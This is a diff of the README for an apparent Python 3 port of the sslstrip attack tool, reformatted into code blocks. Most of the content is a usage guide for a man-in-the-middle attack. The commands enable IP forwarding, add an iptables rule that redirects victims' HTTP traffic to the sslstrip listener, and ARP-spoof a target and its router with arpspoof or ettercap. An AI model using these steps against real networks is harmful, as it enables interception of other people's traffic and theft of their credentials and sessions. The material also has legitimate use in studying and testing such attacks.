@@ -2,34 +2,37 @@
 implementation of moxie marlinspikes sslstrip in python3 
 
 # Requirements:
-
-apt install python3\
+```
+apt install python3
 apt install arpspoof
-pip install twisted\
-pip install python-twisted-web\
+pip install twisted
+pip install pyOpenSSL
 pip install service_identity-23.1.0-py3-none-any.whl #this is in the requirements folder with this repo -- https://pypi.org/project/service_identity/#files
+```
 
 # Running:
-        sslstrip can be run from the source base without installation.
-        Just run 'python sslstrip.py -h' as a non-root user to get the
-        command-line options.
+```
+sslstrip can be run from the source base without installation.
+Just run 'python sslstrip.py -h' as a non-root user to get the
+command-line options.
 
-        The steps to getting this working (assuming you're running Linux)
-        are:
+The steps to getting this working (assuming you're running Linux)
+are:
 
-        1) Flip your machine into forwarding mode (as root):
-           echo "1" > /proc/sys/net/ipv4/ip_forward
+1) Flip your machine into forwarding mode (as root):
+   echo "1" > /proc/sys/net/ipv4/ip_forward
 
-        2) Setup iptables to intercept HTTP requests (as root):
-           iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
+2) Setup iptables to intercept HTTP requests (as root):
+   iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port <yourListenPort>
 
-        3) Run sslstrip with the command-line options you'd like (see above).
+3) Run sslstrip with the command-line options you'd like (see above).
 
-        4) Run arpspoof to redirect traffic to your machine (as root):
-           arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
+4) Run arpspoof to redirect traffic to your machine (as root):
+   arpspoof -i <yourNetworkdDevice> -t <yourTarget> <theRoutersIpAddress>
 
-        5) alternative if arpspoof not available is to use ettercap
-           ettercap -T -S -q -M arp:remote -i <interface> /<ipaddr_client>// /<ipaddr_router>//
+5) alternative if arpspoof not available is to use ettercap
+   ettercap -T -S -q -M arp:remote -i <interface> /<ipaddr_client>// /<ipaddr_router>//
+```
 
 # Output: 
 ```
